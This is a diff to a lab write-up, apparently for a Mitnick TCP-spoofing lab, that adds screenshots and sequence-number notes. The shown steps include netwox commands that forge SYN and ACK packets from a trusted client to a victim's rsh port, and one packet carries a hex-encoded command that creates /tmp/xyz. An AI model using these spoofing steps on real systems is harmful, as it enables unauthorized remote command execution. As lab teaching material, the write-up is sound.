@@ -91,17 +91,32 @@ step 6.1: On the attacker's VM, send a spoofed SYN packet to the victim server.
 # sudo netwox 40 --tcp-syn --ip4-src 172.16.77.128 --ip4-dst 172.16.77.129 --tcp-src 1023 --tcp-dst 514
 ```
 
+This screenshot shows the command:
+![alt text](lab-mitnick-packet1.png "first packet")
+
 step 6.2: right after the above command, netwox would show us the sequence number of this SYN packet, let's say it's x. Then in wireshark, identify the SYN-ACK packet coming from the victim server to the victim client and find out its sequence number, let's say it's y. Now we send the ACK packet to complete the TCP 3-way handshake.
 
 ```console
 # sudo netwox 40 --tcp-ack --ip4-src 172.16.77.128 --ip4-dst 172.16.77.129 --tcp-src 1023 --tcp-dst 514 --tcp-acknum y+1 --tcp-seqnum x+1
 ```
 
+This screenshot shows the command:
+![alt text](lab-mitnick-packet2.png "second packet")
+
+This screenshot shows x is 2247827088, and thus x+1 is 2247827089.
+![alt text](lab-mitnick-first-syn.png "first syn packet")
+
+This screenshot shows y is 734062308, and thus y+1 is 734062309.
+![alt text](lab-mitnick-first-syn-ack.png "first syn packet")
+
 step 6.3: send one ACK packet to the server. This packet carries the command we want to run:
 
 ```console
 # sudo netwox 40 --tcp-ack --ip4-src 172.16.77.128 --ip4-dst 172.16.77.129 --tcp-src 1023 --tcp-dst 514 --tcp-acknum y+1 --tcp-seqnum x+1 --tcp-data "393039300073656564007365656400746f756368202f746d702f78797a00" 
 ```
+
+This screenshot shows the command:
+![alt text](lab-mitnick-packet3.png "third packet")
 
 note: step 6.2 and step 6.3 are the same command, except that --tcp-data part.
 
@@ -125,7 +140,14 @@ step 7.1:
 # sudo netwox 40 --tcp-syn --tcp-ack --ip4-src 172.16.77.128 --ip4-dst 172.16.77.129 --tcp-src 9090 --tcp-dst 1023 --tcp-acknum z+1
 ```
 
+This screenshot shows the command:
+![alt text](lab-mitnick-packet4.png "fourth packet")
+
+This screenshot shows that z is 703071262, and thus z+1 is 703071263.
+![alt text](lab-mitnick-second-syn.png "second syn packet")
+
 ### Verification steps:
 
 step 8. on the victim's server machine, see if /tmp/xyz is created.
 
+![alt text](lab-mitnick-retries.png "changing retry limits")
